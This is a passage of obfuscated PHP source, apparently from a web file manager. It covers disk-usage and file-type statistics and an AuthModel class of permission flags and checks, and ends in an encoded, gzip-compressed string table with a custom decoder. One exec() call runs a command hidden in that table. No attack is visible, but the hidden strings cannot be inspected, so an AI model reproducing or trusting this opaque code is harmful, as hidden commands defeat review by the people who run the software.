$½²¨®ë´[1820]; if (function_exists($½²¨®ë´[1821])) { exec($½²¨®ë´[1822], $£‚¤ìî¹); $ìŸ¶Ó¡ê = $£‚¤ìî¹[1] . $½²¨®ë´[8]; } } if (!file_exists($ìŸ¶Ó¡ê)) { return; } $ùõŞø‘½ = @disk_total_space($ìŸ¶Ó¡ê); $’†¨¾”© = $ùõŞø‘½ - @disk_free_space($ìŸ¶Ó¡ê); return array($½²¨®ë´[1810] => $ùõŞø‘½, $½²¨®ë´[1812] => $’†¨¾”©); } public function fileChart($Ô­Â­³) { $¼ØÏèº =& $_SERVER[¤·²È‰º]; if (isset($Ô­Â­³[$¼ØÏèº[1651]])) { return Model($¼ØÏèº[826])->userFileTypeProfile($Ô­Â­³[$¼ØÏèº[1651]]); } if (isset($Ô­Â­³[$¼ØÏèº[1823]])) { return Model($¼ØÏèº[826])->groupFileTypeProfile($Ô­Â­³[$¼ØÏèº[1823]]); } $ñÄÁ•Ö˜ = $this->sourceSize(); $Ãş„¯Ñ¶ = array($¼ØÏèº[440] => 0, $¼ØÏèº[419] => 1); $ûÊ²îÂ÷ = Model($¼ØÏèº[826])->where($Ãş„¯Ñ¶)->sum($¼ØÏèº[86]); $Ãş„¯Ñ¶[$¼ØÏèº[419]] = 2; $ƒîÚÀ†¯ = Model($¼ØÏèº[826])->where($Ãş„¯Ñ¶)->sum($¼ØÏèº[86]); return array($¼ØÏèº[764] => $ñÄÁ•Ö˜[$¼ØÏèº[86]], $¼ØÏèº[1757] => $ñÄÁ•Ö˜[$¼ØÏèº[1757]], $¼ØÏèº[1758] => (int) $ûÊ²îÂ÷, $¼ØÏèº[1759] => (int) $ƒîÚÀ†¯); } private function sourceSize() { $°Ğ½ƒÑæ =& $_SERVER[¤·²È‰º]; $Àâ¡×¹ô = Model($°Ğ½ƒÑæ[826])->where(array($°Ğ½ƒÑæ[418] => 0))->sum($°Ğ½ƒÑæ[86]); $ßƒû ²Ú = Model($°Ğ½ƒÑæ[479])->sum($°Ğ½ƒÑæ[86]); if ($ßƒû ²Ú > $Àâ¡×¹ô) { $ßƒû ²Ú = $Àâ¡×¹ô; } return array($°Ğ½ƒÑæ[86] => (int) $Àâ¡×¹ô, $°Ğ½ƒÑæ[1757] => (int) $ßƒû ²Ú); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $”…¦‘øş =& $_SERVER[¤·²È‰º]; $˜¡‚ò±î = array(array($”…¦‘øş[428] => LNG($”…¦‘øş[1824]), $”…¦‘øş[1825] => $”…¦‘øş[1826], $”…¦‘øş[1827] => 1, $”…¦‘øş[1828] => 1, $”…¦‘øş[1829] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($”…¦‘øş[428] => LNG($”…¦‘øş[1830]), $”…¦‘øş[1825] => $”…¦‘øş[1831], $”…¦‘øş[1827] => 2, $”…¦‘øş[1828] => 1, $”…¦‘øş[1829] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($”…¦‘øş[428] => LNG($”…¦‘øş[1832]), $”…¦‘øş[1825] => $”…¦‘øş[1833], $”…¦‘øş[1827] => 3, $”…¦‘øş[1828] => 1, $”…¦‘øş[1829] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($”…¦‘øş[428] => LNG($”…¦‘øş[1834]), $”…¦‘øş[1825] => $”…¦‘øş[1835], $”…¦‘øş[1827] => 4, $”…¦‘øş[1828] => 1, $”…¦‘øş[1829] => self::AUTH_SHOW | self::AUTH_VIEW), array($”…¦‘øş[428] => LNG($”…¦‘øş[1836]), $”…¦‘øş[1825] => $”…¦‘øş[1837], $”…¦‘øş[1827] => 5, $”…¦‘øş[1828] => 1, $”…¦‘øş[1829] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($”…¦‘øş[428] => LNG($”…¦‘øş[1838]), $”…¦‘øş[1825] => $”…¦‘øş[1839], $”…¦‘øş[1827] => 6, $”…¦‘øş[1828] => 1, $”…¦‘øş[1829] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($”…¦‘øş[428] => LNG($”…¦‘øş[1840]), $”…¦‘øş[1825] => $”…¦‘øş[1841], $”…¦‘øş[1827] => 7, $”…¦‘øş[1828] => 1, $”…¦‘øş[1829] => 0)); return $˜¡‚ò±î; } public static function authCheck($ìİııÅ®, $éÀîœÖ) { $›ŠøÏá· =& $_SERVER[¤·²È‰º]; $ìİııÅ® = intval($ìİııÅ®); if ($GLOBALS[$›ŠøÏá·[511]] && $GLOBALS[$›ŠøÏá·[6]][$›ŠøÏá·[1842]]) { return !0; } if ($ìİııÅ® <= 0) { return !1; } if (($ìİııÅ® & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ìİııÅ® & $éÀîœÖ); } public static function authCheckShow($®â¡ìä) { return self::authCheck($®â¡ìä, self::AUTH_SHOW); } public static function authCheckView($‘‹†˜Šê) { return self::authCheck($‘‹†˜Šê, self::AUTH_VIEW); } public static function authCheckDownload($ óò¤ÉÅ) { return self::authCheck($ óò¤ÉÅ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ûçœ½Û) { return self::authCheck($ûçœ½Û, self::AUTH_UPLOAD); } public static function authCheckEdit($ª†É°â) { return self::authCheck($ª†É°â, self::AUTH_EDIT); } public static function authCheckRemove($åÍñÊºÈ) { return self::authCheck($åÍñÊºÈ, self::AUTH_REMOVE); } public static function authCheckShare($¡«“ËÀ) { return self::authCheck($¡«“ËÀ, self::AUTH_SHARE); } public static function authCheckComment($ã¨¢¤Ÿ‚) { return self::authCheck($ã¨¢¤Ÿ‚, self::AUTH_COMMENT); } public static function authCheckEvent($™ŸºŞ –) { return self::authCheck($™ŸºŞ –, self::AUTH_EVENT); } public static function authCheckRoot($£‚ê«ü) { return self::authCheck($£‚ê«ü, self::AUTH_ROOT); } public static function authCheckAction($şŠŞ˜Öë, $ì¼‹š¬¸) { $¯Ôäˆ =& $_SERVER[¤·²È‰º]; $¤ú–Öêª = array($¯Ôäˆ[1843] => self::AUTH_VIEW, $¯Ôäˆ[1193] => self::AUTH_DOWNLOAD, $¯Ôäˆ[117] => self::AUTH_UPLOAD, $¯Ôäˆ[1793] => self::AUTH_EDIT, $¯Ôäˆ[1792] => self::AUTH_REMOVE, $¯Ôäˆ[1803] => self::AUTH_SHARE, $¯Ôäˆ[363] => self::AUTH_COMMENT, $¯Ôäˆ[1639] => self::AUTH_EVENT, $¯Ôäˆ[1844] => self::AUTH_ROOT); if (!isset($¤ú–Öêª[$ì¼‹š¬¸])) { return; } $¡ÑİßÓ÷ = $¤ú–Öêª[$ì¼‹š¬¸]; $şŠŞ˜Öë = intval($şŠŞ˜Öë); if ($şŠŞ˜Öë <= 0) { return !1; } if (($şŠŞ˜Öë & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($şŠŞ˜Öë & $¡ÑİßÓ÷); } public static function authDisable($Ïü«³·Õ, $°ªùÊÕÓ) { if (intval($Ïü«³·Õ) <= 0) { return 0; } return intval($Ïü«³·Õ) & ~$°ªùÊÕÓ; } public $optionType = "\123\171\163\x74\145\155\56\163\x6f\165\x72\143\x65\101\165\164\x68\114\151\x73\164"; public $field = array("\156\x61\155\x65", "\141\x75\x74\x68", "\x6c\141\x62\x65\x6c", "\144\151\163\x70\x6c\141\171", "\x73\171\x73\x74\145\x6d", "\163\x6f\162\x74"); public function initData() { $íòÛŒÖ = $this->authDefault(); foreach ($íòÛŒÖ as $”…˜ïÔ) { $this->add($”…˜ïÔ); } } public function findAuth($­úÒª»¤, $…˜ŸÎ) { $ò…èÔ‡‘ =& $_SERVER[¤·²È‰º]; $ìğå‰™¼ = parent::listData(); foreach ($ìğå‰™¼ as $çÁ‘Àô¿) { $ˆ»ì—ıÄ = intval($çÁ‘Àô¿[$ò…èÔ‡‘[421]]); if ($ˆ»ì—ıÄ <= 0 || $çÁ‘Àô¿[$ò…èÔ‡‘[1845]] == 0) { continue; } if (($ˆ»ì—ıÄ & $­úÒª»¤) != $­úÒª»¤) { continue; } if (($ˆ»ì—ıÄ & $…˜ŸÎ) != 0) { continue; } return $çÁ‘Àô¿[$ò…èÔ‡‘[407]]; } return !1; } public function findAuthReadOnly() { $¥³ƒÀçù = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $›¦¢ÖØŸ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($¥³ƒÀçù, $›¦¢ÖØŸ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $†Ö§œ•¤ =& $_SERVER[¤·²È‰º]; $Ö—Í› = parent::listData(); $²ÒúÄš = !1; foreach ($Ö—Í› as $ü˜ÁßËÓ) { if ($ü˜ÁßËÓ[$†Ö§œ•¤[421]] <= 0 || $ü˜ÁßËÓ[$†Ö§œ•¤[1845]] == $†Ö§œ•¤[207]) { continue; } if (!$²ÒúÄš) { $²ÒúÄš = $ü˜ÁßËÓ; continue; } if ($²ÒúÄš[$†Ö§œ•¤[421]] > $ü˜ÁßËÓ[$†Ö§œ•¤[421]]) { $²ÒúÄš = $ü˜ÁßËÓ; } } return $²ÒúÄš ? $²ÒúÄš[$†Ö§œ•¤[407]] : $†Ö§œ•¤[12]; } public function listData($¶×ÉÀàü = false, $Ş¡¸¼­ = "\163\157\162\x74", $»ëíŒÆ = false) { return parent::listData($¶×ÉÀàü, $Ş¡¸¼­, $»ëíŒÆ); } public function update($ë¯ø—Å’, $æô‰¡Œ) { $Û ´ÖÎ¶ =& $_SERVER[¤·²È‰º]; $î˜„Š = parent::listData($ë¯ø—Å’); $¸àÉİ½ø = $this->findByName($æô‰¡Œ[$Û ´ÖÎ¶[42]]); if (!$î˜„Š || $¸àÉİ½ø && $¸àÉİ½ø[$Û ´ÖÎ¶[407]] != $î˜„Š[$Û ´ÖÎ¶[407]]) { return !1; } $this->filterAuth($æô‰¡Œ[$Û ´ÖÎ¶[421]]); return parent::update($ë¯ø—Å’, $æô‰¡Œ); } public function remove($ä×ğ²ÊÆ) { $Ç¤ëéıÒ = parent::listData($ä×ğ²ÊÆ); if (!$Ç¤ëéıÒ || $Ç¤ëéıÒ[$_SERVER[¤·²È‰º][1270]]) { return !1; } return parent::remove($ä×ğ²ÊÆ); } public function add($áôù±Î = array()) { $‡Ú²ûå =& $_SERVER[¤·²È‰º]; if ($this->findByName($áôù±Î[$‡Ú²ûå[42]])) { return !1; } $¬©‹ñŸï = array($‡Ú²ûå[42] => $‡Ú²ûå[12], $‡Ú²ûå[421] => 1, $‡Ú²ûå[1846] => $‡Ú²ûå[1833], $‡Ú²ûå[1845] => 1, $‡Ú²ûå[1270] => 0, $‡Ú²ûå[1847] => 0); $áôù±Î = array_merge($¬©‹ñŸï, $áôù±Î); $áôù±Î[$‡Ú²ûå[1847]] = $this->getSort(); $this->filterAuth($áôù±Î[$‡Ú²ûå[421]]); return parent::insert($áôù±Î); } private function getSort() { $¹ÔÏ…–Ğ =& $_SERVER[¤·²È‰º]; $ôÚÑŒœ = parent::listData(); $Óßê·¡ = array_to_keyvalue($ôÚÑŒœ, $¹ÔÏ…–Ğ[12], $¹ÔÏ…–Ğ[1847]); return empty($Óßê·¡) ? 0 : max($Óßê·¡) + 1; } private function filterAuth(&$¼ø«ÀÇ) { if (!$¼ø«ÀÇ) { return; } $îëëÒã÷ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ö÷™ÓÊ˜ = array(); foreach ($îëëÒã÷ as $Ùãô†Ø‡) { if ($¼ø«ÀÇ & $Ùãô†Ø‡) { $ö÷™ÓÊ˜[] = $Ùãô†Ø‡; } } if (in_array(self::AUTH_ROOT, $ö÷™ÓÊ˜)) { $¼ø«ÀÇ = array_sum($îëëÒã÷); return; } $‚”éÁŸò = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ö÷™ÓÊ˜ as $Ùãô†Ø‡) { if (isset($‚”éÁŸò[$Ùãô†Ø‡])) { $ö÷™ÓÊ˜ = array_merge($ö÷™ÓÊ˜, $‚”éÁŸò[$Ùãô†Ø‡]); } } $ö÷™ÓÊ˜[] = self::AUTH_SHOW; $¼ø«ÀÇ = array_sum(array_unique($ö÷™ÓÊ˜)); } public function sort($§Ñ…ğ¿ä, $ Ğ‹²ç‘) { return parent::update($§Ñ…ğ¿ä, $ Ğ‹²ç‘); } } goto FçóğÄ¥âö; D‹ƒÈìÆóÂ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\244\267\262\310\211\272", "\x8d\xa9\xe9\xef\xe1\xe2"); $_SERVER[¤·²È‰º] = explode("\x7c\x2\x7c\x2\x7c\x1", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\7\230\33\325\325\50\20\123\3\11\241\47\41\60\54\230\335\265\125\166\327\225\265\327\106\273\253\365\12\153\245\105\322\272\355\232"."\361\110\32\111\343\225\64\332\231\321\26\27\172\111\350\11\41\324\37\102\213\51\241\327\140\14\241\45\241\204\222\74\10\206\220\77\24\67\40\205\320\2\44\341\335\162\156\231"."\221\26\376\367\275\367\175\317\140\353\336\163\313\334\162\356\271\347\334\173\316\271\147\77\163\303\263\157\274\266\156\27\364\337\316\67\237\172\312\45\47\377\221\206\321\177\123\326"."\xed\x46\xc3\x87\x9f\xb3\xc7\x4e\xe4\xcf\xfe\xe7\x9c\xdd\xd4\xd4\x3b\x7b\xaf\xe9\xb1\xbd\x2f\xb8\xe7\x56\xed\xe7\xda\x4d\xda\x39\xf1\xe8\x33\xcf\x46\xf6\x79\xee\xe7\xc7\x85\xb7\x5e\xf7\xcc\xc4".strrev('€hÓ£¦KÒÔDŸÒ'."\r".'ı2†Fs–c )±Û'."\r".'ÇÑGM”£úvÙi™GoŸ¡ã:wÖ')."\376\250\320\56\32\321\162\106\121\117\32\153\364\110\131\206\320\60\16\251\171\335\121\321\107\34\275\314\76\331\31\112\106\272\324\376\120\252\227\306\265\112\45\150\147\207\355\240"."\x66\x65\xa\xc6\xa8\x1e\x35\xd2\xc1\xb4\x51\xe\x66\x35\x47\xb\xa4\x59\xa3\xf6\xa2\x3f\x33\xa1\xd9\x5\x3d\x33\xac\x6a\x69\xd3\x72\xf4\x2c\x5\x55\xcb\x45\xa3\x3c\x2c\xb7\xce\x1e\x29\x1a\xac".base64_decode('9WosnlKTA/394UQKutAup5fMLIQqmqWVoKkV3bLRWMnVqRWzopddEAHATU5rNtTU')."\xdd\xa9\x76\x87\xfb\xa3\xf1\xe5\x6a\x6a\x79\x7f\x18\x72\xa4\xd5\x91\xaa\x6e\x4d\xd0\x18\x9\x26\x1d\xcd\x72\x52\x46\x49\xe7\x39\xc6\x2c\xde\xae\xce\xf0\xa2\x48\x4c\x49\x25\x42\xb1\x64\xa8\x2b"."\x15\x89\xc7\x28\xb8\x2b\xde\xd7\x17\x49\xd5\xc2\x13\xf1\x68\xb4\x33\xd4\xb5\xb8\x36\xa5\x3f\x11\x5a\xd4\x17\x52\x50\xfb\xd0\xa4\x18\xe5\x9c\xd9\xa4\xac\xa2\x29\xab\x94\x66\x1a\xe8\x31\xf4\x22"._kodDe('LFj+VUtjvxwYPAIC45Q0p2SWSgqDVwGO5x9IWrS9Z3yDhlfIJrfb9uz0eUb4xQ9ZGg==').base64_decode('aCQ87liagKO2ZhAaIvShsGQ4Gu5KKbiBSk8i3qfAJJQ029EtZWlvOBFWcKM7Gklf').strrev('‘8jjGIšTË2T³B1Ë(NÑ<YS©–†«'."\n".'¥èàÕ“*%'."\n".'æÀ')."\240\1\37\54\276\150\4\117\32\104\342\75\75\311\60\217\101\347\216\217\242\226\314\0\374\164\305\262\271\242\243\216\152\305\52\103\123\100\365\106\370\201\137\323\6\324\35\61"."\312\106\25\320\24\252\60\115\276\350\41\120\145\271\165\6\321\263\20\50\241\362\46\15\32\150\375\216\322\140\307\2\372\73\17\62\245\361\332\36\325\55\107\325\313\31\63\153"."\x94\x81\x94\x2c\x4\xa4\xd3\x9c\x42\xb7\x85\xd6\xb4\x45\xe3\x39\xb3\x98\x65\x61\x1b\x51\x8d\x75\x9c\x4e\xc4\xaa\x25\x39\xb\x8f\x22\x8a\x50\xcc\x5a\x6c\x7d\x7d\x59\x4e\x1a\x8d\xf2\xe5\x8a\xf3"."\x8a\x58\x5\xb5\x64\x1d\x5b\xe9\x46\x6e\x42\xac\x37\xdb\xac\x5a\x19\x44\xbf\x72\xa6\x28\xd7\xcf\x73\xb7\x42\x26\xdd\x71\x50\xe7\x60\x6c\xc\x73\xa0\x52\x34\xb5\x6c\x52\xb7\x78\xd7\xc\xb3\x7"."\25\214\127\35\31\130\45\331\172\114\253\324\215\50\3\174\37\255\12\143\240\116\302\60\133\27\131\151\304\202\115\203\247\370\377\263\162\360\130\364\117\63\20\346\41\150\123\101"."\x2f\x16\x55\x7d\x5c\x87\x85\x53\xca\xce\xb2\xd9\x60\x4\x6d\x4c\x41\x11\x84\x46\x23\x71\xb5\xa0\xd9\x85\xbe\xec\x2c\x95\x94\x82\x26\x97\xb3\xfa\x78\xa0\x52\xa8\xd0\xa8\x58\xd2\x43\x2e\xc4\xc6"."\103\27\63\235\260\264\153\24\315\214\126\224\273\110\303\5\307\251\44\365\162\266\207\157\1\131\163\254\114\106\252\242\63\72\335\355\123\262\112\237\262\134\351\155\67\332\155\126"."\260\124\344\41\326\73\16\263\71\320\31\147\323\231\315\321\0\337\37\32\340\203\206\115\50\234\130\236\150\173\51\32\31\315\61\314\162\320\314\70\272\343\267\35\113\327\240\306"."\120\46\243\333\266\277\13\355\120\226\131\364\207\212\105\163\314\37\267\214\274\121\156\127\246\321\74\135\164\373\362\143\2\330\16\53\265\141\236\202\21\5\177\146\132\107\325\311".strrev('ÏxòKã¾¨ˆ)€¦Z8æŠíy¸iŠì6ëeTåA]£+?–éÎÙZ[sÈ²çù')."\xd3\x6b\xf2\x86\xc7\x2b\x86\xa5\xdb\xac\xad\xca\xa2\xbe\x14\x54\x82\x6a\xd7\xfd\xfd\x96\x96\x2f\x69\xed\x4a\xa5\x9a\x46\x23\x3\x2b\xb5\xe\x8c\xe6\x86\xa1\x69\x57\x32\x38\xea\x53\x4a\x55\xdb".strrev('T¡}«–ĞzF¯Õ*ohQ¥…B'."\n".'™–ŒğÅ\'õ†W^9#`îÚE":[ñ').strrev('2Â{'."\0".'õ%€xæÓfl2»DçpúéoØ¯¨b¹_Z?2à2UæG6³ËGa0').strrev('>Î2XF^fÀJZ“Ş2j„–\'˜+ç/Ttwš=  :8OIñãÎV„ş8®éã')."\x85\xab\x2e\xfa\x13\x7a\x16\xd\x7d\xc6\x61\xe5\xb4\xa\x1e\x35\x96\x7\x2f\xe\x3c\x57\x2c\x15\x2f\x18\x96\x16\x8d\x2c\xc2\x3\xd3\xed\xb7\x51\x26\xbf\x9c\x8b\xd5\x1d\x35\x4a\x6\x6e\xbb\xc3"."\123\310\110\242\235\176\21\64\50\110\72\324\61\124\230\326\64\224\235\336\354\107\377\116\153\36\34\352\16\114\133\271\60\150\210\62\301\326\100\253\322\326\62\133\351\107\254\207".base64_decode('oRUV6HRNjhYlvtg9LAKby2ZZ/5LBwXuXtOw9w0qBifDxA+FkSu0Lp3rj3fD1cAhC')."\x51\x93\x2e\x5b\xd6\xdb\x41\xfa\xb3\x12\x66\x77\x25\xfd\x51\xd\xbb\x47\xda\x56\x70\x94\x93\x1f\xd5\x4c\xaf\x46\x93\xd1\xa7\x33\x1a\x9b\xa3\x34\x3a\x52\xd2\xf2\x1e\x92\x8f\x63\x7d\xa6\xa5\xbb"."\x21\xeb\xf8\x56\xb5\xd4\xc8\xb2\x3d\x1\x47\x7b\x75\x23\x5f\x80\xf1\x32\x70\x6d\x19\xb3\x68\x5a\x5a\x11\x53\x46\xb6\x28\x74\x46\xad\xf2\x6\x50\x2b\x20\xc2\x22\x92\x34\x4a\x15\xd6\x58\xa7\x50"."\55\245\245\40\120\173\33\341\17\243\145\5\223\357\147\210\363\245\241\366\40\144\234\332\326\3\213\61\36\114\316\100\377\13\322\236\65\113\32\43\224\204\304\351\131\112\343\50"."\150\232\53\245\127\327\304\46\355\130\216\211\241\226\53\13\32\320\202\11\23\213\30\174\150\122\225\267\215\265\62\253\27\165\66\32\5\235\155\23\55\220\15\155\163\174\254\204".base64_decode('1IC4PQQV+7NhJ1BJTNRZfClmjwXA4VmLaIeKkxkX8X5LzxmwSMtoRvo0a5j1Bs2A')."\300\25\34\221\360\250\147\40\32\125\273\342\261\24\142\251\51\144\151\42\222\12\63\274\15\165\253\241\256\376\165\154\343\25\63\12\31\60\201\161\43\276\140\237\107\333\240\341"."\xa8\x39\x41\xb1\xcd\x21\x8a\x5d\x31\xcb\xb6\xee\x7\x71\xc9\x2f\x58\xef\x9a\xa4\xac\xd8\x5\x68\xe\x69\xe7\xf0\x6c\x6\xe3\x7e\xad\xb4\xc6\x5f\x42\x4b\xc0\xcf\x1b\xea\xde\x83\x15\xd8\x1d\xe8"."\x56\x1e\x81\x59\x12\xc4\x1d\xf\x23\x92\x8a\xd8\xe6\xdf\x1f\x4f\x42\x81\x85\x18\x8a\x18\xb0\xb4\x6e\xc1\xc7\xfa\x7\x20\xa9\x24\x61\xc8\xa2\x30\x0\xed\x82\x6\xfc\x54\x68\x69\x92\x51\xe4\x2a"."\xca\x68\x19\x6b\x34\xd1\x97\x85\xac\x21\xac\x7\xa5\xa2\x60\xe4\xdc\xdd\xf1\x8b\x21\x4f\xf5\x46\x62\x8b\xd5\xbe\x78\x77\x38\xaa\x46\x62\x88\x24\xa5\x6a\xe1\x3\xfd\xdd\x21\x36\x87\x32\xbc\x33".base64_decode('zoRRgA4gorQkFI14s4eXRZKpZN0kBBsIe1KQBNifCPdElvFoTyQc7U6qXaGuXpEn')."\26\352\203\210\232\303\62\230\35\164\347\127\21\165\115\162\111\116\35\305\122\251\311\5\156\131\170\122\231\130\240\12\344\101\273\250\16\50\6\335\305\262\60\351\11\110\302\31"."\263\312\150\77\347\40\113\214\70\224\64\130\75\32\333\41\233\350\117\263\22\112\52\116\5\352\100\144\40\75\301\203\244\33\54\216\170\105\370\276\2\224\276\246\5\52\316\323".base64_decode('qec4Aa4PCOUcTuc9cYT1Ig3NQIgI3QgTyIzAZwy0hiwnxJqTEwKvGu8PJ0JYXFaX')."\46\342\261\105\120\140\254\240\263\6\104\140\370\233\30\127\5\122\263\43\50\21\142\211\64\46\76\211\101\137\155\262\241\134\107\177\216\246\77\210\33\204\217\353\145\66\352\151".base64_decode('TJTZtsICObQaGEE1q/xradOELxQxY7COUQouda+2GZKMMxozHT44DhtDKr44HFMZ')."\146\321\230\204\215\24\200\344\330\170\2\6\304\61\207\231\60\106\23\23\341\44\133\336\226\76\122\65\330\160\5\3\323\1\213\165\264\367\300\347\203\47\14\215\115\157\32\364".strrev('éÊÿÿ‹Mš5şCÛM‚‡·6²j_˜Òñj¾PQè®†Ä(ÒÇiæD¬O')."\x43\x81\xe6\xe9\x0\x58\xb9\xb6\xcd\x37\x73\x3d\xce\x80\x32\x2e\x3c\x72\x25\xfa\xe9\x18\x5a\x38\x75\xc8\x7f\xf4\x89\xab\x8e\x1d\x1c\x5a\xd9\xd8\x3e\xfd\x88\xa1\xc0\x91\x43\x63\x2b\xa7\x35\x2f"."\x64\xdf\xc9\x54\x2d\x24\x68\x66\x26\x78\x53\xb3\xd3\x9b\x50\x93\x10\x1f\xc5\xb3\x94\x9\xad\x93\x32\xb0\x84\x35\x46\x45\x40\xd7\xce\x5e\xcf\xe0\x68\xe\xf5\xbc\x28\x31\xe8\x1f\x9a\xbe\x72\xa1"."\124\116\2\171\277\205\370\44\104\170\13\74\137\310\277\2\367\214\27\305\353\36\360\243\132\316\10\352\211\327\105\132\313\0\35\60\362\145\276\204\320\146\316\5\164\67\373\276"."\166\52\375\135\317\46\62\257\303\242\47\347\203\26\140\147\265\154\214\260\363\207\262\76\2\1\323\141\370\235\326\235\61\235\241\7\202\273\342\10\71\230\314\210\222\244\130\221".base64_decode('cITwBSxJcRzlyGRUVMxajfFYVi/DPO0Jue2MVtGTUg9VNRXqjIZVRmGAErM4oYqd').base64_decode('/KwOdU1QVEYfMoJ3J2IKrHx7pKgQwqDolmVa7eRQ1a5WME+GRDIHja2ChHmlY4FC')."\x87\x1c\xca\xa9\xf2\x4\x54\x34\xc6\x20\x60\x31\x5b\x17\x8b\x1e\x53\x28\x68\x53\x45\xcc\x90\x8d\x38\x29\xc6\xd6\x4\x9b\x86\x86\xaa\x83\x7a\x76\xe5\x20\x42\x7c\xcd\x9f\x5b\xb9\x76\xc6\xfa\x66"."\306\336\7\207\320\37\26\11\325\71\100\123\71\65\124\321\306\34\300\355\340\147\50\256\10\117\246\121\323\342\274\121\305\305\75\73\246\243\25\135\125\244\60\4\46\227\157\334"."\x70\x9a\x40\x67\x3b\x2a\x28\x16\xde\xca\xa5\x93\x47\x42\x4e\x63\x5c\x7a\xe7\x87\x22\xd2\xd1\x17\x2e\x91\xd4\x9d\x0\xcf\xe1\x93\x12\x55\x14\x87\xfe\x75\x34\xc0\xfa\x30\xca\x68\x21\x75\x49\x9b".base64_decode('HD3NSU7Yjl5yHVTaOj6E7qkWiw7n3ovGMNQNqwTOTf30R5ler2iPaTEheBo0o2Fa')."\275\214\221\162\31\211\254\62\222\211\355\165\121\10\61\62\51\245\211\235\361\51\221\230\322\31\217\107\303\241\230\202\167\162\330\201\20\233\220\14\367\207\320\366\205\305\351\144".strrev('aò>Ky† È–'."\n".'DE›0ËÂEDÆŠ‡i‚³pŠ¡Ì»ÕŸ·Hğ œ*')."\303\207\372\340\303\22\221\117\60\356\76\161\306\346\33\65\364\61\22\340\374\265\17\330\156\237\243\131\210\125\300\174\61\4\43\335\76\303\356\46\62\3\371\0\111\142\15\162".strrev('Ÿ@3‰ö<a"0ø,õ‹4–€5š®ôL}‹Xù¦±ô^¨ú¢ãhøM¨£èø'."\n".'').base64_decode('OVbWLZIFhkmIGz4hivjyllmt9LNvSjHaLACINnNAwjQdHxMvfbLkCa0IsfVSdzjr')._kodDe('LHjpsX4DqWkimyqGaFSwXKS12Vcfl6F0J7EK35CgaFQuy2weJBTcGXh2MnqIfvfGLQ==').base64_decode('o43KmFcPC9mew9BYHPiJo17BA3uFSu8hMP5oSssnpc85Wp59CxMxlDppVhpO6JmJ')."\214\220\122\273\45\331\327\35\163\57\256\52\252\57\251\345\74\235\364\221\125\126\157\205\324\307\0\216\365\174\302\366\332\163\117\66\342\154\51\360\331\167\255\240\257\136\273\320"."\113\102\56\343\25\301\152\320\306\142\142\235\104\133\137\117\221\15\121\233\234\14\144\332\347\216\341\245\27\40\144\233\334\244\44\371\161\106\64\334\223\122\216\213\43\112\147\230".strrev('y˜šúê,|#w@¸«ƒHûGU`ı¡VB–rµÄ]$)pÙº®+,Çù'."\n".'Ìâ£-*')."\60\162\220\356\213\75\214\201\342\142\313\254\2\177\250\331\40\251\341\223\161\10\351\14\46\246\126\306\122\211\30\11\0\153\227\353\273\70\52\126\30\103\11\5\177\0\52\40".base64_decode('HA0mOH6xVqSoe8g9GOnZaPEQ9RvlCaMsH2IJ6Dq+VwtWAS91z7Fb92RhusWIQzIf').strrev('A£ˆ0˜I£&K4Æua·ÙPœ2@ôè]œ¶Õ÷r\\årzÔ‹™´¯5ğù